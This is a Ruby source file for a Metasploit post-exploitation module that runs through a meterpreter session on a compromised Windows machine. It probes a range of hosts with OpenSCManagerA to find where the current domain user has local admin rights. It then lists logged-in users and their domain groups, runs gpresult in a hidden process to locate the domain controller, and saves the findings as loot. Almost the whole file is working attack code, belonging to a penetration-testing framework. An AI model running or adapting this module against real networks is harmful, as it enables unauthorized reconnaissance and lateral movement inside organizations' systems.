##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Priv
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(
			'Name'         => 'Windows Local Admin Search',
			'Description'  => %q{
				This module will identify systems in a given range that the
				supplied domain user (should migrate into a user pid) has administrative
				access to by using the windows api OpenSCManagerA to establishing a handle
				to the remote host. Additionally it can enumerate logged in users and group
				membership via windows api NetWkstaUserEnum and NetUserGetGroups.
				},
			'License'      => MSF_LICENSE,
			'Version'      => '$Revision: 14767 $',
			'Author'       => [ 'Brandon McCann "zeknox" <bmccann [at] accuvant.com>', 'Thomas McCarthy "smilingraccoon" <smilingraccoon [at] gmail.com>', 'Royce Davis "r3dy" <rdavis [at] accuvant.com>'],
			'Platform'     => [ 'windows'],
			'SessionTypes' => [ 'meterpreter' ]
			)

		register_options(
			[
				OptBool.new('ENUM_USERS', [ true, 'Enumerates logged on users.', true]),
				OptBool.new('ENUM_GROUPS', [ false, 'Enumerates groups for identified users.', true]),
				OptString.new('DOMAIN', [false, 'Domain to enumerate user\'s groups for', nil]),
				OptString.new('DOMAIN_CONTROLLER', [false, 'Domain Controller to query groups', nil])

			], self.class)
	end

	def run()
		if is_system?
			# running as SYSTEM and will not pass any network credentials
			print_error "Running as SYSTEM, module should be run with USER level rights"
			return
		else
			@adv = client.railgun.advapi32

			# Get domain and domain controller if options left blank
			if datastore['DOMAIN'].nil?
				user = client.sys.config.getuid
				datastore['DOMAIN'] = user.split('\\')[0]
			end

			if datastore['DOMAIN_CONTROLLER'].nil? and datastore['ENUM_GROUPS']
				datastore['DC_ERROR'] = false

				# Uses DC which applied policy since it would be a DC this device normally talks to
				cmd = "gpresult /SCOPE COMPUTER"
					# If Vista/2008 or later add /R
					if (client.sys.config.sysinfo['OS'] =~ /Build [6-9]\d\d\d/)
						cmd << " /R"
					end
				res = run_cmd(cmd)

				# Check if RSOP data exists, if not disable group check
				unless res =~ /does not have RSOP data./
						datastore['DOMAIN_CONTROLLER'] = /Group Policy was applied from:\s*(.*)\s*/.match(res)[1].chomp
					else
						datastore['DC_ERROR'] = true
						print_error("User never logged into device, will not enumerate groups or manually specify DC.")
					end
			end
		super
		end
	end

	# main contrl method
	def run_host(ip)
		connect(ip)
	end

	# http://msdn.microsoft.com/en-us/library/windows/desktop/aa370669(v=vs.85).aspx
	# enumerate logged in users
	def enum_users(host, currentdomain)
		begin
		# Connect to host and enumerate logged in users
		winSessions = client.railgun.netapi32.NetWkstaUserEnum("\\\\#{host}", 1, 4, -1, 4, 4, nil)

		count = winSessions['totalentries'] * 2
		startmem = winSessions['bufptr']

		base = 0
		userlist = Array.new
		mem = client.railgun.memread(startmem, 8*count)
		# For each entry returned, get domain and name of logged in user
		count.times{|i|
				temp = {}
				userptr = mem[(base + 0),4].unpack("V*")[0]
				temp[:user] = client.railgun.memread(userptr,255).split("\0\0")[0].split("\0").join
				nameptr = mem[(base + 4),4].unpack("V*")[0]
				temp[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join

				# Ignore if empty or machine account
				unless temp[:user].empty? or temp[:user][-1, 1] == "$"

					# Check if enumerated user's domain matches supplied domain, if there was
					# an error, or if option disabled
					data = ""
					if datastore['DOMAIN'].upcase == temp[:domain].upcase and not datastore['DC_ERROR'] and datastore['ENUM_GROUPS']
						data = " - Groups: #{enum_groups(temp[:user]).chomp(", ")}"
					end
					line = "\tLogged in user:\t#{temp[:domain]}\\#{temp[:user]}#{data}\n"

					# Write user and groups to notes database
					db_note(host, "#{temp[:domain]}\\#{temp[:user]}#{data}", "localadmin.user.loggedin")
					userlist << line unless userlist.include? line

				end

				base = base + 8
		}
		rescue ::Exception => e
			print_error("Issue enumerating users on #{host}")
		end
		return userlist

	end

	# http://msdn.microsoft.com/en-us/library/windows/desktop/aa370653(v=vs.85).aspx
	# Enumerate groups for identified users
	def enum_groups(user)
		grouplist = ""

		dc = "\\\\#{datastore['DOMAIN_CONTROLLER']}"
		begin
			# Connect to DC and enumerate groups of user
			userGroups = client.railgun.netapi32.NetUserGetGroups(dc, user, 0, 4, -1, 4, 4)

		rescue ::Exception => e
			print_error("Issue connecting to DC, try manually setting domain and DC")
		end

			count = userGroups['totalentries']
			startmem = userGroups['bufptr']
			base = 0

		begin
			mem = client.railgun.memread(startmem, 8*count)
		rescue ::Exception => e
			print_error("Issue reading memory for groups for user #{user}")
		end

		begin
			# For each entry returned, get group
			count.to_i.times{|i|
					temp = {}
					groupptr = mem[(base + 0),4].unpack("V*")[0]
					temp[:group] = client.railgun.memread(groupptr,255).split("\0\0")[0].split("\0").join

					# Add group to string to be returned
					grouplist << "#{temp[:group]}, "
					if (i % 5) == 2
						grouplist <<"\n\t-   "
					end
					base = base + 4
			}

		rescue ::Exception => e
			print_error("Issue enumerating groups for user #{user}, check domain")
		end

		return grouplist.chomp("\n\t-   ")

	end

	# http://msdn.microsoft.com/en-us/library/windows/desktop/ms684323(v=vs.85).aspx
	# method to connect to remote host using windows api
	def connect(host)
		user = client.sys.config.getuid
		# use railgun and OpenSCManagerA api to connect to remote host
		manag = @adv.OpenSCManagerA("\\\\#{host}", nil, 0xF003F) # SC_MANAGER_ALL_ACCESS

		if(manag["return"] != 0) # we have admin rights
			result = "#{host.ljust(16)} #{user} - Local admin found\n"
			# Run enumerate users on all hosts if option was set

			if datastore['ENUM_USERS']
				enum_users(host, datastore['DOMAIN']).each {|i|
					result << i
				}
			end

			# close the handle if connection was made
			@adv.CloseServiceHandle(manag["return"])
			# Append data to loot table within database
			db_loot(host, user, "localadmin.user")
			print_good(result.chomp("\n")) unless result.nil?
		else
			# we dont have admin rights
			print_error("#{host.ljust(16)} #{user} - No Local Admin rights")
		end
	end

	# From enum_domain_group_users.rb by Carlos Perez and Stephen Haywood
	# Run command, return results
	def run_cmd(cmd)
		process = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
		res = ""

		while (d = process.channel.read)
		break if d == ""
			res << d
		end

		process.channel.close
		process.close
		return res
	end

	# Write to notes database
	def db_note(host, data, type)
		if db
			report_note(
				:type  => type,
				:data  => data,
				:host  => host,
				:update => :unique_data
			)
		end
	end

	# Write to loot database
	def db_loot(host, user, type)
		if db
			store_loot(
				type,
				'text/plain',
				host,
				"#{host}:#{user}",
				'hosts_localadmin.txt',
				user
			)
		end
	end
end